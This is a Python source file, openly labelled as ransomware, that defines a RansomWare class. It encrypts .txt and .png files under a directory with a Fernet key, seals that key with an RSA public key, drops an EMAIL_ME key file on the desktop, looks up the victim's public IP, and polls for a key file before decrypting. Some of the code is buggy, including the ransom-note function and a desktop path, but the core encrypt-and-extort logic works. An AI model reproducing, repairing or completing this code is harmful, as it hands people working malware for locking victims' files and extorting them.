'''
A randsomware
'''
##import the required library
from cryptography.fernet import Fernet 
import os 
import ctypes 
import urllib.request
import requests
import time
import datetime
import subprocess 
import win32gui
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import base64
import threading 



class RansomWare:

    
    # File exstensions to seek out and Encrypt
    file_exts = [
        'txt',
        'png', 
    ]


    def __init__(self):
        '''
        the initialization
        '''
        self.key = None
        self.crypter = None
        self.public_key = None
        self.sysRoot = os.path.expanduser('~')
        self.localRoot = r'D:\Coding\Python\RansomWare\RansomWare_Software\localRoot'
        self.publicIP = requests.get('https://api.ipify.org').text ## get targets' address


 
    def generate_key(self):
        ''' Generate a key'''
        self.key =  Fernet.generate_key()
        # Creates a Fernet object with encrypt/decrypt methods
        self.crypter = Fernet(self.key)

    
    # Write the Fernet key to text file
    def write_key(self):
        with open('fernet_key.txt', 'wb') as f:
            f.write(self.key)

    def encrypt_fernet_key(self):
        '''
        To encryt the keys
        '''
        with open('fernet_key.txt', 'rb') as fk:
            fernet_key = fk.read()
        with open('fernet_key.txt', 'wb') as f:
            self.public_key = RSA.import_key(open('public.pem').read())
            public_crypter =  PKCS1_OAEP.new(self.public_key)
            enc_fernent_key = public_crypter.encrypt(fernet_key)
            f.write(enc_fernent_key)
        with open(f'{self.sysRoot}Desktop/EMAIL_ME.txt', 'wb') as fa:
            fa.write(enc_fernent_key)
        # Assign self.key to encrypted fernet key
        self.key = enc_fernent_key
        # Remove fernet crypter object
        self.crypter = None


    def crypt_file(self, file_path, encrypted=False):
        '''
        To encryt the files using the public keys generated
        '''
        with open(file_path, 'rb') as f:
            data = f.read()
            if not encrypted:
                print(data)
                _data = self.crypter.encrypt(data)
                print('> File encrpyted')
                print(_data)
            else:
                _data = self.crypter.decrypt(data)
                print('> File decrpyted')
                print(_data)
        with open(file_path, 'wb') as fp:
            fp.write(_data)

    def crypt_system(self, encrypted=False):
        system = os.walk(self.localRoot, topdown=True)
        for root, dir, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                if not file.split('.')[-1] in self.file_exts:
                    continue
                if not encrypted:
                    self.crypt_file(file_path)
                else:
                    self.crypt_file(file_path, encrypted=True)


    @staticmethod


    def ransom_note(self):
        date = datetime.date.today().strftime('%d-%B-Y')
        with open('RANSOM_NOTE.txt', 'w') as f:
            f.write(f"{self.sysRoot}")


    
    def put_me_on_desktop(self):
        print('started') # Debugging/Testing
        while True:
            try:
                print('trying') # Debugging/Testing
                with open(f'{self.sysRoot}/Desktop/PUT_ME_ON_DESKTOP.txt', 'r') as f:
                    self.key = f.read()
                    self.crypter = Fernet(self.key)
                    # Decrpyt system once have file is found and we have cryptor with the correct key
                    self.crypt_system(encrypted=True)
                    print('decrypted') # Debugging/Testing
                    break
            except Exception as e:
                print(e) # Debugging/Testing
                pass
            time.sleep(10)
            print('Checking for PUT_ME_ON_DESKTOP.txt')



def main():
    rw = RansomWare()
    rw.generate_key()
    rw.crypt_system()
    rw.write_key()
    rw.encrypt_fernet_key()
    rw.ransom_note()
    t2 = threading.Thread(target=rw.put_me_on_desktop)

    t2.start()
    print('> RansomWare: Target machine has been un-encrypted') # Debugging/Testing
    print('> RansomWare: Completed') # Debugging/Testing



if __name__ == '__main__':
    main()
 
